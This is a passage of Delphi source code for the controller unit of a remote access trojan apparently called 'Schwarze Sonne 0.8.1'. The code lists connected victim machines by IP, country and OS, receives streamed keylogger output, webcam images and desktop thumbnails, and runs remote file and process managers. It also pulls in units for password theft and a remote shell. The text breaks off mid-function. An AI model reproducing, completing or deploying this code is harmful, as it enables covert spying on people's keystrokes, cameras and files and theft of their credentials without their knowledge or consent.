unit uConn;
interface
uses Windows,zlib,uPass,uScreenNor,uInformation,uRemoteshell,
    uFilemanager,ShellAPI,graphics,Classes,sysUtils,Winsock,ComCtrls,
    uRegistryeditor,StdCtrls, ExtCtrls,jpeg, uScreen,uProcess,ucamspy,
    uAudioStream,
    ukeylogger, dialogs,uNotify;
type
  TDUMMYUNIONNAME = record
    case integer of
      0: (uTimeout: UINT);
      1: (uVersion: UINT);
  end;
TInfo = Record
    socket        :integer;
    Lent          :integer;
  End;
  PInfo = ^TInfo;
type
TNotifyIconData = record
    cbSize:  DWORD;
    Wnd:     HWND;
    uID:     UINT;
    uFlags:  UINT;
    uCallbackMessage: UINT;
    hIcon:   HICON;
    szTip:   array [0..127] of char;
    dwState: DWORD;
    dwStateMask: DWORD;
    szInfo:  array [0..255] of char;
    DUMMYUNIONNAME: TDUMMYUNIONNAME;
    szInfoTitle: array [0..63] of char;
    dwInfoFlags: DWORD;
  end;
type
  TConnThread = class(TThread)
  private
    ConnSock:Integer;
    TransSocket:Integer;
    TempSocket:Integer;
    TransSize:Integer;
    TransName:string;
    tsListitem:TListItem;
    TransferedSize:Integer;
    TransSpeed:Integer;
    TransTimeLeft:string;
    tTempScreen:Tform4;
    tTempScreenN:Tform12;
    pString:string;
    tTempCam:TForm7;
    tTempKeylog:TForm10;
    KlogText:string;
    KlogListitem:TListItem;
    kListitem:Tlistitem;
    kLogMess:string;
    kLogComp:string;
    kLogAddition:string;
    mPoint:pointer;
    tTempFilemanager:Tform2;
    tTempAudio : TForm19;
    krListItem:TListitem;
    sItem: TListItem;
    tTempItem:Tlistitem;

  protected
    procedure Execute; override;
  public
    tMyThread:TThread;
    procedure TOnTerminate(Sender: TObject);
    constructor Create(CreateSuspended: Boolean);
    procedure SetSocket(sValue: Integer);
    Function ListenHost:DWord;
    Function Explode(sDelimiter: String; sSource: String): TStringList;
    procedure HandleTerminate(Sender: TObject);
    procedure TransFile();
    procedure TransThumbDesktop();
    procedure GetTItem();
    procedure AddtoList();
    procedure DelFromList();
    procedure ShowNotify();
    procedure UpdateList();
    procedure GetTimeLeft();
    procedure GetForm12();
    procedure SetStatus();
    procedure SetStatusWebcam();
    procedure GetForm5();
    procedure TransCam();
    procedure Notify(tItem: TListItem);
    procedure AddKeylog;
    procedure SendFile();
    procedure AddtoList2();
    procedure TransKeylog();
    procedure GetForm10();
    procedure GetForm2();
    procedure SetStatus2();
    procedure KeylogString();
    procedure killListitem;
    procedure TransThumb();
  end;
  function RandomPassword(PLen: Integer): string;
  Function GetPath: String;
var
  Info:Tinfo;

implementation
uses uSettings, mainU, uFlag, uTransferView;

Function GetPath: String;
Begin
  Result := ExtractFilePath(ParamStr(0)) + 'Downloads\';
  If (Not DirectoryExists(Result)) Then
    CreateDirectory(pChar(Result), NIL);
End;
procedure TConnThread.AddKeylog;
begin
if TForm10(KlogListitem.SubItems.Objects[4]).checkbox1.checked then begin
if Klogtext = '[Space]' then Klogtext := ' ';
if Klogtext = '[Enter]' then Klogtext :=  #13 + #10;
if Klogtext = '[Delete]' then begin
  TForm10(KlogListitem.SubItems.Objects[4]).redt1.text := copy(TForm10(KlogListitem .SubItems.Objects[4]).redt1.text,1,length(TForm10(KlogListitem .SubItems.Objects[4]).redt1.text) - 1);
  KlogText := '';
end;
end;
TForm10(KlogListitem.SubItems.Objects[4]).redt1.text := TForm10(KlogListitem .SubItems.Objects[4]).redt1.text + KlogText;
end;

procedure TConnThread.SetSocket(sValue: Integer);
begin
  ConnSock := sValue;
end;
procedure TConnThread.killListitem;
begin
  sitem.delete;
  MainForm.Caption := 'Schwarze Sonne 0.8.1 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;
Function RemoteAddr(Sock: TSocket): TSockAddrIn;
Var
  W     :TWSAData;
  S     :TSockAddrIn;
  I     :Integer;
Begin
  WSAStartUP($0202, W);
  I := SizeOf(S);
  GetPeerName(Sock, S, I);
  WSACleanUP();
  Result := S;
End;
function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  if Length(s1) <> length(s2) then exit;
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s2[i] = '%' then begin
      Result[i] := s1[i];
    end else begin
      Result[i] := s2[i];
    end;
  end;
end;

procedure TConnThread.GetTimeLeft();
Var
  dDay  :Integer;
  dHour :Integer;
  dMin  :Integer;
  dSec  :Integer;
  dTmp  :Integer;
  dTmp2 :Integer;
Begin
  If TransSpeed = 0 Then Exit;
  If Transferedsize = 0 Then Exit;

  dDay := 0; dHour := 0; dMin := 0;
  dTmp2 := 0; dTmp := 0;

  While dTmp2 <= (transsize - Transferedsize) Do
  Begin
    Inc(dTmp2, TransSpeed);
    Inc(dTmp, 1);
  End;

  dSec := dTmp;

  If dSec > 60 Then
    repeat
      dec(dSec, 60);
      inc(dMin, 1);
    until dSec < 60;

  If dMin > 60 Then
    repeat
      dec(dMin, 60);
      inc(dHour, 1);
    until dMin < 60;

  If dHour > 24 Then
    repeat
      dec(dHour, 24);
      inc(dDay, 1);
    until dHour < 24;

  TransTimeLeft := IntToStr(dDay)  + 'd '+
            IntToStr(dHour) + 'h '+
            IntToStr(dMin)  + 'm '+
            IntToStr(dSec)  + 's';
End;
Function RemoteAddress(Sock: TSocket): String;
Begin
  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
End;
procedure TConnThread.DelFromList();
begin
tsListitem.Delete;
end;
procedure TConnThread.ShowNotify();
var
formnotify:tform90;
begin
if krListItem = nil then exit;
FormNotify := TForm90.create(nil,krListItem);
          formnotify.Visible := true;
          formnotify.Timer.Enabled := true;
end;
procedure TConnThread.Notify(tItem: TListItem);
var
  Mensaje, Titulo: string;
  Item: TListItem;
begin
  item    := tItem;
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.uFlags := $10;
  Mensaje := 'IP: ' + Item.caption + #13 + 'Country: ' + Item.SubItems.Strings[3] + #13 + 'OS: ' + Item.SubItems.Strings[4] ;
  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
  Titulo := Item.SubItems[2] + ' Connected!';
  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
  TrayIconData.dwInfoFlags := $00000001;
  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
  TrayIconData.DUMMYUNIONNAME.uVersion := 3;
  if not Shell_NotifyIcon($00000004, @TrayIconData) then
end;
Function RemotePort(Sock: TSocket): String;
Begin
  Result := IntToStr(nTohs(RemoteAddr(Sock).sin_port));
End;

procedure TConnThread.UpdateList();
var
  smd:extended;
begin
smd := TransferedSize / TransSize;
if trunc(smd * 100) <= 100 then begin
tsListitem.SubItems.Strings[1] := IntToStr(trunc(smd * 100)) + ' %';
tsListitem.SubItems.Strings[2] := TransTimeLeft;
end else begin
tsListitem.SubItems.Strings[1] := '100 %';
tsListitem.SubItems.Strings[2] := TransTimeLeft;
end;
end;

procedure TConnThread.AddtoList();
begin
tsListitem := Form3.lv1.Items.Add;
tsListitem.Caption := Transname;
tsListitem.SubItems.Add(IntToStr(TransSize));
tsListitem.SubItems.Add('0 %');
tsListitem.SubItems.Add('-');
tsListitem.SubItems.Add('Downloading');
tsListitem.ImageIndex := 0;
tslistitem.SubItems.Objects[0] := tMyThread;
end;

procedure TConnThread.AddtoList2();
begin
tsListitem := Form3.lv1.Items.Add;
tsListitem.Caption := Transname;
tsListitem.SubItems.Add(IntToStr(TransSize));
tsListitem.SubItems.Add('0 %');
tsListitem.SubItems.Add('-');
tsListitem.SubItems.Add('Uploading');
tsListitem.ImageIndex := 1;
tslistitem.SubItems.Objects[0] := tMyThread;
end;

Function SendData(Sock: TSocket; Text: String): Integer;
Begin
  Result := Send(Sock, Text[1], Length(Text), 0);
End;

procedure TConnThread.HandleTerminate(Sender: TObject);
begin
  //MainForm.Caption := 'Schwarze Sonne 0.2 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;

constructor TConnThread.Create(CreateSuspended: Boolean);
begin
  inherited;
  ConnSock := 0;
end;

procedure TConnThread.TOnTerminate(Sender: TObject);
begin

   if sitem <> nil then begin
  synchronize(killlistitem);
   end;
end;

procedure TConnThread.Execute;
begin
  onterminate := TOnTerminate;
  FreeOnTerminate:=True;
  try
  ListenHost;
  except
  sleep(1);
  end;
end;

Function TConnThread.Explode(sDelimiter: String; sSource: String): TStringList;
Var
  c: Word;
Begin
  Result := TStringList.Create;
  C := 0;

  While sSource <> '' Do
  Begin
    If Pos(sDelimiter, sSource) > 0 Then
    Begin
      Result.Add(Copy(sSource, 1, Pos(sDelimiter, sSource) - 1 ));
      Delete(sSource, 1, Length(Result[c]) + Length(sDelimiter));
    End
    Else
    Begin
      Result.Add(sSource);
      sSource := ''
    End;

    Inc(c);
  End;
End;
procedure TConnThread.GetTItem();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempitem := mainform.lv1.Items.Item[f];
       Exit;
    end;
end;
end;
procedure TConnThread.GetForm5();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempCam := TForm7(mainform.lv1.items.item[f].subitems.Objects[3]);
       Exit;
    end;
end;
end;
procedure TConnThread.GetForm2();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempFilemanager := TForm2(mainform.lv1.items.item[f].subitems.Objects[0]);
       Exit;
    end;
end;
end;

procedure TConnThread.GetForm10();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempKeylog := TForm10(mainform.lv1.items.item[f].subitems.Objects[4]);
       Exit;
    end;
end;
end;

procedure TConnThread.GetForm12();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempScreenN := TForm12(mainform.lv1.items.item[f].subitems.Objects[6]);
       Exit;
    end;
end;
end;
procedure TConnThread.KeylogString();
begin
tTempKeylog.redt2.text := pString;
end;

procedure TConnThread.SetStatus();
begin
  tTempScreenN.pb1.Max := TransSize;
  tTempScreenN.pb1.Position := TransferedSize;
end;

procedure TConnThread.SetStatus2();
begin
tTempkeylog.pb1.max := TransSize;
  tTempkeylog.pb1.Position := TransferedSize;
end;

procedure TConnThread.SetStatusWebcam();
begin
tTempCam.pb1.max := TransSize;
tTempCam.pb1.Position := TransferedSize;
end;
procedure DecompressStream(inpStream, outStream: TStream);
var
  InpBuf, OutBuf: Pointer;
  OutBytes, sz: Integer;
begin
  InpBuf := nil;
  OutBuf := nil;
  sz     := inpStream.Size - inpStream.Position;
  if sz > 0 then
    try
      GetMem(InpBuf, sz);
      inpStream.Read(InpBuf^, sz);
      DecompressBuf(InpBuf, sz, 0, OutBuf, OutBytes);
      outStream.Write(OutBuf^, OutBytes);
    finally
      if InpBuf <> nil then FreeMem(InpBuf);
      if OutBuf <> nil then FreeMem(OutBuf);
    end;
  outStream.Position := 0;
end;
function RandomPassword(PLen: Integer): string;
var
str: string;
begin
Randomize;
str := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
Result := '';
repeat
Result := Result + str[Random(Length(str)) + 1];
until (Length(Result) = PLen)
end;
procedure TConnThread.TransCam();
var
  h:tmemorystream;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  jpg: TJPEGImage;
  Data:string;
Label
  Disconnected,
  Finished,TotalEnd;
begin
  Synchronize(getform5);
  h := TMemoryStream.Create;
  TransferedSize := 0;
  Synchronize(SetStatusWebcam);
  BytesSize := 0;
  T := 'ok';
  ttempcam.stat1.Panels.Items[3].Text := 'Size : ' + IntToStr(transsize) + ' Bytes';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        h.Write(rFile,TransSize - total + 1);
        ttempcam.pb1.Position := TransSize;
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        h.Write(rFile,dErr);
        ttempcam.pb1.Position := total;
      end;
      TransferedSize := Total;
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  h.Position := 0;
  if h.Size = 0 then begin
    ttempcam.PngBitBtn1.Caption := 'Start';
    Data := '48|' + #10;
    send(tempsocket,data[1],length(data),0);
    ttempcam.sStop := true;
    MessageBox(ttempcam.handle,PChar('No Webcam installed!'),PChar('Error!'),0);
    goto Totalend;
  end;
  jpg := TJPEGImage.Create;
  jpg.LoadFromStream(h);
  ttempcam.img1.Picture.Assign(jpg);
  if ttempcam.sStop = false then begin
    Data := '29|' + ttempcam.Stat1.Panels[0].Text +  '|' + IntToStr(ttempcam.TrackBar1.Position) +'|' + #10;
    send(TempSocket,data[1],Length(data),0);
  end else begin
    Data := '48|' + #10;
    send(tempsocket,data[1],length(data),0);
  end;
Totalend:
  h.Free;
end;
procedure TConnThread.TransThumb();
var
  h:tmemorystream;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  jpg: TJPEGImage;
Label
  Disconnected,
  Finished,TotalEnd;
begin
  Synchronize(getform2);
  ttempfilemanager.lbl3.Caption := 'Thumbnails is being transfered! Please wait!';
  h := TMemoryStream.Create;
  TransferedSize := 0;
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        h.Write(rFile,TransSize - total + 1);
        ttempfilemanager.pb1.Position := TransSize;
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        h.Write(rFile,dErr);
        ttempfilemanager.pb1.Position := total;
      end;
      TransferedSize := Total;
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto totalend;

Finished:
  h.Position := 0;
  if h.Size = 0 then begin
    ttempfilemanager.lbl3.Caption := 'Cant take Thumbnail of this File!';
    ttempfilemanager.img1.Picture := nil;
    goto Totalend;
  end;
  jpg := TJPEGImage.Create;
  jpg.LoadFromStream(h);
  ttempfilemanager.img1.Picture.Assign(jpg);
  ttempfilemanager.lbl3.Caption := 'Thumbnail received!';
Totalend:
  h.Free;
end;



procedure TConnThread.TransThumbDesktop();
var
  h:tmemorystream;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  jpg: TBitmap;
Label
  Disconnected,
  Finished,TotalEnd;
begin
  h := TMemoryStream.Create;
  TransferedSize := 0;
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        h.Write(rFile,TransSize - total + 1);
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        h.Write(rFile,dErr);
      end;
      TransferedSize := Total;
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto totalend;

Finished:
  h.Position := 0;
  if h.Size = 0 then begin
    goto Totalend;
  end;
    jpg := TBitmap.Create;
    jpg.LoadFromStream(h);
    gettitem;
    if tTempitem <> nil then begin
    if tTempitem.SubItems.Count > 8 then begin
    MainForm.AddPicture(tTempitem,jpg);
    end;
    end;
Totalend:
  h.Free;
  //jpg.free;
end;

Function  StreamToString(AStream: TStream): String;
Begin
  SetLength(Result, AStream.Size);
  AStream.Position := 0;
  AStream.ReadBuffer(Result[1], AStream.Size);
End;


procedure TConnThread.SendFile();
Var
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..8000] Of Char;
  Total:Integer;
  dErr:Integer;
  Start         :Cardinal;
Begin
  Synchronize(AddtoList2);
  {$I-}
  AssignFile(F, transname);
  Reset(F, 1);
  Start := GetTickCount;
  Total := 1;
  Repeat
    BlockRead(F, Buf, SizeOf(Buf), BytesRead);
    If (BytesRead = 0) Then Break;
    dErr := Send(TransSocket, Buf[0], SizeOf(Buf), 0);
    If dErr = -1 Then Break;
    Inc(Total, derr);
    FillChar(Buf, SizeOf(Buf), 0);
    dErr := Recv(TransSocket, Buf, SizeOf(Buf), 0);
    If dErr = -1 Then Break;
    TransferedSize := Total;
    TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
    Synchronize(GetTimeLeft);
    Synchronize(updatelist);
  Until BytesRead = 0;
  CloseFile(F);
  {$I+}
Sleep(1000);
Synchronize(delfromlist);
End;

procedure TConnThread.TransKeylog();
var
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  Start:Integer;
  dBuff: pchar;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
Label
  Disconnected,
  Finished;
begin
  Synchronize(GetForm10);
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Start := GetTickCount;
    Total := 1;
    Synchronize(SetStatus2);
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        GetMem(dBuff, dErr);
        CopyMemory(dBuff, @rFile, dErr);
        pString := pString + dBuff;
        Inc(Total, derr);
        tTempKeylog.pb1.Position := TransSize;
      end else begin
        Inc(Total, dErr);
        GetMem(dBuff, dErr);
        CopyMemory(dBuff, @rFile, dErr);
        pString := pString + dBuff;
        tTempKeylog.pb1.Position := Total;
      end;
      TransferedSize := Total;
      TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  Synchronize(KeylogString);
  Sleep(1000);
end;
procedure TConnThread.TransFile();
var
  F:THandle;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  Start:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  BytesWritten:Cardinal;
Label
  Disconnected,
  Finished;
begin
  Synchronize(AddtoList);
  F := CreateFile(pChar(GetPath+TransName), GENERIC_WRITE, FILE_SHARE_WRITE, NIL, CREATE_NEW, 0, 0);
  BytesSize := 0;
  SetFilePointer(F, 0, NIL, FILE_END);
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Start := GetTickCount;
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        SetFilePointer(F, 0, NIL, FILE_END);
        WriteFile(F, rFile, TransSize - total + 1, BytesWritten, NIL);
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        SetFilePointer(F, 0, NIL, FILE_END);
        WriteFile(F, rFile, dErr, BytesWritten, NIL);
      end;
      TransferedSize := Total;
      TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
      Synchronize(GetTimeLeft);
      Synchronize(updatelist);
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  CloseHandle(F);
  Synchronize(delfromlist);
  Sleep(1000);
  //closesocket(TransSocket);
end;
procedure startmes(p:pointer); STDCALL;
var
  mPoint:pointer;
  msgs:tmsg;
  sd,st:integer;
begin
  sd :=pinfo(p)^.Lent;
  st :=pinfo(p)^.socket;
  plugins[sd].Call(@sKillme,st,mPoint);
   while GetMessage(Msgs, 0, 0, 0) do
    begin
      TranslateMessage(Msgs);
      DispatchMessage(Msgs);
    end;
    Halt(Msgs.wParam);
end;
Function TConnThread.ListenHost:DWord;
label Disconnect;
Var
  Address, Port :String;
  Sock: TSocket;
  Buffer: Array[0..1600] Of Char;
  Data: String;
  sTempSTRr:string;
  Len: Integer;
  Temp: String;
  Cmd: String;
  pStrList :tstringlist;
  cStrList:TStringList;
  I: Word;
  sThreadID:cardinal;
  saItem:TListItem;
  sFileman :TForm2;
  sProcman:TForm5;
  sKeylogF:TForm10;
  sRegEditr:Tform11;
  sScreenCapture:TForm12;
  sPasswords:TForm13;
  Nodo: TTreeNode;
  sDat:string;
  mIDs:integer;
  mKillThreadID:cardinal;
  Msgs:TMsg;
  IconIndex : Integer;
  FormNotify :TForm90;
Begin
  mIDs := 0;
  Sock := ConnSock;
  Address := RemoteAddress(Sock);
  Port := RemotePort(Sock);
  sDat := '';
  Repeat
    Len := Recv(Sock, Buffer, 1600, 0);
    If (Len <= 0) Then Break;
    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    sDat := sDat + Data;
    if Copy(sDat,Length(sdat),1) = #10 then begin
      Temp := Copy(sDat, 1, Pos(#10, sDat)-1);
      pStrList := Explode('|',Temp);
      cmd := pStrList.Strings[0];
        if cmd = '01' then begin
          if pStrList.Strings[1] <> form1.edt2.Text then begin
            Break;
          end else begin
            sleep(1000);
            sTempSTRr := '60|' + #10;
            send(sock,stempstrr[1],Length(sTempSTRr),0);
          end;
        end;

        if Cmd = '02' then begin
          //if sitem = nil then break;
          sItem := mainform.lv1.Items.Add;
          sItem.Caption := Address;
          sItem.SubItems.Add(inttostr(sock));
          sItem.SubItems.Add(pstrlist.Strings[6]);
          sItem.SubItems.Add(pStrList.Strings[1]);
          sItem.SubItems.Add(GetCountry(pStrList.Strings[3]) + ' @ '  + pStrList.Strings[3]);
          sItem.SubItems.Add(pStrList.Strings[2]);
          sItem.SubItems.Add(pStrList.Strings[4] + ' MHZ');
          sItem.SubItems.Add(pstrlist.Strings[5]);
          if pstrlist.Strings[5] = 'Y' then begin
            sitem.SubItemImages[6] := 135;
            sitem.SubItems.Strings[6] := 'Yes';
          end else begin
            sitem.SubItemImages[6] := 136;
            sitem.SubItems.Strings[6] := 'No';
          end;
          sItem.SubItems.Add(pstrlist.Strings[7]);
          sItem.SubItems.Add(pstrlist.Strings[8]);
          sItem.SubItems.Add('');
          sItem.SubItems.Add('');
          sItem.ImageIndex := GetFlag(pStrList.Strings[3]);
          MainForm.Caption := 'Schwarze Sonne 0.8.1 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
          //Notify(sItem);
          if form1.CheckBox1.Checked then begin
            krListItem := sItem;
            synchronize(shownotify);
          end;
        end;
        if cmd = '190' then begin
          if sitem <> nil then begin
            if sitem.SubItems.Count > 8 then begin
               sitem.SubItems.Strings[8] :=  pstrlist.Strings[1];
            end;
          end;
        end;
        if cmd = '12' then begin
            if sItem.SubItems.Objects[0] <> nil then begin
              TForm2(sItem.SubItems.Objects[0]).Show;
            end else begin
              sFileman := tform2.Create(nil);
              sFileman.Show;
              sFileman.Caption := 'Filemanager - ' +  sItem.SubItems.Strings[1];
              sFileman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
              sFileman.stat1.Panels.Items[1].Text := sItem.Caption;
              sFileman.cbb1.Clear;
              sItem.SubItems.Objects[0] := sFileman;
            end;
            for i := 1 to pStrList.Count - 1 do begin
              TForm2(sItem.SubItems.Objects[0]).cbb1.AddItem(pStrList.Strings[i],nil);
            end;
        end;

        if cmd = '16' then begin
           if sItem.SubItems.Objects[2] <> nil then begin
           TForm5(sItem.SubItems.Objects[2]).Show;
          end else begin
            sProcman := tform5.Create(nil);
            sProcman.Show;
            sProcman.Caption := 'Manager - ' +  sItem.SubItems.Strings[1];
            sProcman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sProcman.stat1.Panels.Items[1].Text := sItem.Caption;
            sProcman.lv1.Clear;
            sItem.SubItems.Objects[2] := sFileman;
          end;
          TForm5(sItem.SubItems.Objects[2]).lv1.Enabled := false;
          TForm5(sItem.SubItems.Objects[2]).lv1.Items.BeginUpdate;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);

              saItem := TForm5(sItem.SubItems.Objects[2]).lv1.Items.Add;
              saItem.Caption := cStrList.Strings[2];
              saItem.SubItems.Add(cStrList.Strings[1]);
              saItem.SubItems.Add(cStrList.Strings[0]);
          end;
          TForm5(sItem.SubItems.Objects[2]).lv1.Items.endUpdate;
          TForm5(sItem.SubItems.Objects[2]).lv1.Enabled := true;
        end;

        if Cmd = '18' then
        begin
          if sItem.SubItems.Objects[0] <> nil then
          begin
            TForm2(sItem.SubItems.Objects[0]).Show;
          end
          else
          begin
            sFileman := tform2.Create(nil);
            sFileman.Show;
            sFileman.Caption := 'Filemanager - ' +  sItem.SubItems.Strings[1];
            sFileman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sFileman.stat1.Panels.Items[1].Text := sItem.Caption;
            sFileman.cbb1.Clear;
            sItem.SubItems.Objects[0] := sFileman;
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Enabled := false;
          TForm2(sItem.SubItems.Objects[0]).lv1.Items.BeginUpdate;
          for i := 1 to pStrList.Count - 1 do
          begin
            cStrList := Explode('#',pStrList.Strings[i]);
            If (cStrList.Strings[2] <> '.') Then
            Begin
              saItem := TForm2(sItem.SubItems.Objects[0]).lv1.Items.Add;
              saItem.Caption := cStrList.Strings[2];
              If (cStrList.Strings[2] = '..') Then
              begin
                saItem.SubItems.Add('Go Back');
                saItem.ImageIndex := 2;
                saItem.SubItems.Add(' ');   //is this necessary anymore :S
             end
             else
             begin
               If (cStrList.Strings[0] = 'DIR') Then
               begin
                 saItem.ImageIndex := 0;
               end
               else
               begin
                 //IconIndex := TForm2(sItem.SubItems.Objects[0]).GetFileIcon(cStrList.Strings[2]);
                 saItem.ImageIndex := 1;
               end;
               saItem.SubItems.Add(cStrList.Strings[0]);
               saItem.SubItems.Add(cStrList.Strings[1] + ' Bytes');
             end;
            end;
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Items.endUpdate;
          if TForm2(sItem.SubItems.Objects[0]).lv1.Items.count = 0 then begin
            TForm2(sItem.SubItems.Objects[0]).stat1.panels[2].text := 'Cant access directory!';
          end else begin
            TForm2(sItem.SubItems.Objects[0]).stat1.panels[2].text := 'Files listed!';
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Enabled := true;
        end;

        if cmd = '24' then begin
          Tempsocket :=  strtoint(pStrList.Strings[1]);
          TransSocket:= Sock;
          for i := 0 to MainForm.lv1.Items.Count -1 do begin
            if MainForm.lv1.Items.Item[i].SubItems.Strings[0]= IntToStr(TempSocket) then begin
              tTempScreen := TForm4(mainform.lv1.items.item[i].subitems.Objects[1]);
            end;
          end;
          tTempScreen.stat1.Panels.Items[2].Text := IntToStr(Sock);          //TransScreen;
          Break;
        end;

        if cmd = '26' then begin
          TransSize := StrToInt(pStrList.Strings[1]);
          TransName :=  ExtractFileName(pStrList.Strings[2]);
          TransSocket := Sock;
          TransFile;
          goto disconnect;
        end;

        if cmd = '116' then begin
          TransSize := StrToInt(pStrList.Strings[1]);
          TransName :=  ExtractFileName(pStrList.Strings[2]);
          tempsocket := strtoint(pStrList.Strings[3]);
          TransSocket := Sock;
          TransThumb;
          goto disconnect;
        end;

        if cmd = '29' then begin
          Tempsocket :=  strtoint(pStrList.Strings[1]);
          TransSocket:= Sock;
          for i := 0 to MainForm.lv1.Items.Count -1 do begin
            if MainForm.lv1.Items.Item[i].SubItems.Strings[0]= IntToStr(TempSocket) then begin
              tTempCam := TForm7(mainform.lv1.items.item[i].subitems.Objects[3]);
            end;
          end;
          if tTempCam.stat1.Panels.Items[2].Text <> '0' then goto disconnect;
          tTempCam.img1.Enabled := true;
          tTempCam.pb1.Enabled := true;
          tTempCam.Label1.Enabled := true;
          tTempCam.Label2.Enabled := true;
          tTempCam.TrackBar1.Enabled := true;
          tTempCam.lbl1.Enabled := true;
          tTempCam.cbb1.Enabled := true;
          tTempCam.PngBitBtn3.Enabled := true;
          tTempCam.stat1.Panels.Items[2].Text := IntToStr(Sock);
          if tTempCam.cbb1.Items.Count <> 0 then begin
          tTempCam.PngBitBtn1.Enabled := true;
          sTempSTRr := 'CONN' + copy(tTempCam.cbb1.text,2,pos('>',tTempCam.cbb1.Text) - 1);
          Send(Sock, sTempSTRr[1], Length(sTempSTRr), 0);
          end;
          tTempCam.ProcessData;
          goto disconnect;
        end;
        if cmd = '32' then begin
          if sItem.SubItems.Objects[4] <> nil then begin
            KlogText := pStrList.Strings[1];
            KlogListitem := sItem;
            Synchronize(AddKeylog);
          end;

        end;
        if cmd = '33' then begin
          if sItem.SubItems.Objects[4] <> nil then begin
           KlogText := #13 + #13 + pStrList.Strings[1] + #13;
            KlogListitem := sItem;
           Synchronize(AddKeylog);
          end;

        end;
        if cmd = '35' then begin
